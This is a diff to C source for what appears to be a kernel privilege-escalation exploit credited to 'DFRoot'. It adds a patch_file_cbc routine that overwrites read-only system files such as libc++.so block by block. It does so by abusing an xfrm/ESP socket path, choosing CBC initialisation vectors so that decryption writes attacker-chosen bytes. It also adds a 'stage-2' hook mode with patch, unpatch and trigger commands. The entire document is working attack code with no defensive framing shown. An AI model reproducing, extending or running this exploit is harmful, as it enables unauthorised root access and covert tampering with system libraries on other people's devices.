@@ -33,10 +33,16 @@
 
 #include "aes256.h"
 
+int hook_main(int argc, char **argv);
+
 #define OFF1 0x0100
 #define OFF2 0x1100
 
 static uint8_t g_aes_key[32];
+
+/* shared with hook.c (stage-2) */
+uint32_t    g_spi;
+int         g_encap_port, g_sender_port;
 
 static void compute_iv(const uint8_t old[16], const uint8_t desired[16], uint8_t iv[16]) {
     uint8_t dec[16];
@@ -94,6 +100,46 @@ static int one_write(int sk, int pipe_rd, int pipe_wr, int file_fd,
         return -1;
     }
     return 0;
+}
+
+/* Patch `len` bytes (must be a 16-multiple) into `path` at file offset `foff`
+ * — DFRoot's patch_file_cbc, re-factored onto this file's one_write(). Stage-2
+ * hook.c uses it for libc++.so; stage-1 uses it implicitly for its 2 blocks. */
+int patch_file_cbc(const char *path, const char *payload, size_t len,
+                   size_t foff, int use_helper) {
+    (void)use_helper; /* system files: pread-based read, no crash_dump bridge */
+    if (len % 16 != 0) { printf("patch_file_cbc: len %zu not 16-multiple\n", len); return -1; }
+
+    int sk = tx_socket(g_encap_port, g_sender_port);
+    if (sk < 0) return -1;
+    int file_fd = open(path, O_RDONLY);
+    if (file_fd < 0) {
+        printf("patch_file_cbc: open %s: %s\n", path, strerror(errno));
+        close(sk); return -1;
+    }
+    int pfd[2];
+    if (pipe(pfd) < 0) {
+        printf("patch_file_cbc: pipe: %s\n", strerror(errno));
+        close(file_fd); close(sk); return -1;
+    }
+
+    int rc = 0;
+    for (size_t i = 0; i < len / 16; i++) {
+        off_t off = (off_t)(foff + i * 16);
+        uint8_t old[16];
+        if (pread(file_fd, old, 16, off) != 16) {
+            printf("patch_file_cbc: pread 0x%lx: %s\n", (long)off, strerror(errno));
+            rc = -1; break;
+        }
+        uint8_t iv[16];
+        compute_iv(old, (const uint8_t *)payload + i * 16, iv);
+        if (one_write(sk, pfd[0], pfd[1], file_fd, off, g_spi, iv)) {
+            rc = -1; break;
+        }
+        usleep(150000);
+    }
+    close(pfd[0]); close(pfd[1]); close(file_fd); close(sk);
+    return rc;
 }
 
 static unsigned long xfrm_err(const char *key) {
@@ -160,15 +206,21 @@ static void env_report(void) {
 int main(int argc, char **argv) {
     setvbuf(stdout, NULL, _IONBF, 0);
 
-    int encap_port = 0, sender_port = 0, file_fd = -1;
+    int file_fd = -1;
     unsigned long spi = 0;
     const char *path = NULL;
+    int have_encap = 0, have_sender = 0, have_spi = 0, have_file = 0;
+
+    /* stage-2 tokens parsed by hook.c itself (its own --hook-* namespace) */
+    const char *hook_mode = NULL;
+    for (int i = 1; i < argc; i++)
+        if (!strcmp(argv[i], "--hook-mode") && i + 1 < argc) hook_mode = argv[i + 1];
 
     for (int i = 1; i < argc; i++) {
-        if (!strcmp(argv[i], "--encap-port") && i + 1 < argc) encap_port = atoi(argv[++i]);
-        else if (!strcmp(argv[i], "--sender-port") && i + 1 < argc) sender_port = atoi(argv[++i]);
-        else if (!strcmp(argv[i], "--spi") && i + 1 < argc) spi = strtoul(argv[++i], NULL, 0);
-        else if (!strcmp(argv[i], "--file") && i + 1 < argc) path = argv[++i];
+        if (!strcmp(argv[i], "--encap-port") && i + 1 < argc) { g_encap_port = atoi(argv[++i]); have_encap = 1; }
+        else if (!strcmp(argv[i], "--sender-port") && i + 1 < argc) { g_sender_port = atoi(argv[++i]); have_sender = 1; }
+        else if (!strcmp(argv[i], "--spi") && i + 1 < argc) { spi = strtoul(argv[++i], NULL, 0); have_spi = 1; }
+        else if (!strcmp(argv[i], "--file") && i + 1 < argc) { path = argv[++i]; have_file = 1; }
         else if (!strcmp(argv[i], "--aes-key") && i + 1 < argc) {
             const char *h = argv[++i];
             if (strlen(h) != 64) { printf("bad aes key length\n"); return 2; }
@@ -176,9 +228,20 @@ int main(int argc, char **argv) {
                 unsigned int b; if (sscanf(h + 2 * j, "%2x", &b) != 1) { printf("bad key\n"); return 2; }
                 g_aes_key[j] = (uint8_t)b;
             }
-        } else { printf("usage: %s --encap-port N --sender-port N --spi N --aes-key HEX --file P\n", argv[0]); return 2; }
+        } else if (strstr(argv[i], "--hook-") == argv[i] && i + 1 < argc) { i++; }
+        else { printf("usage: %s [--encap-port N --sender-port N --spi N --aes-key HEX] [--file P] [--hook-mode M ...]\n", argv[0]); return 2; }
     }
-    if (!encap_port || !sender_port || !spi || !path) { printf("missing args\n"); return 2; }
+    g_spi = (uint32_t)spi;
+
+    /* stage-2 dispatch: hook mode runs its own CLI contract
+     * (status/patch/unpatch/trigger/full) */
+    if (hook_mode) {
+        return hook_main(argc, argv);
+    }
+
+    if (!have_encap || !have_sender || !have_spi || !have_file) { printf("missing args\n"); return 2; }
+    int encap_port = g_encap_port, sender_port = g_sender_port;
+    (void)spi;
 
     env_report();
 
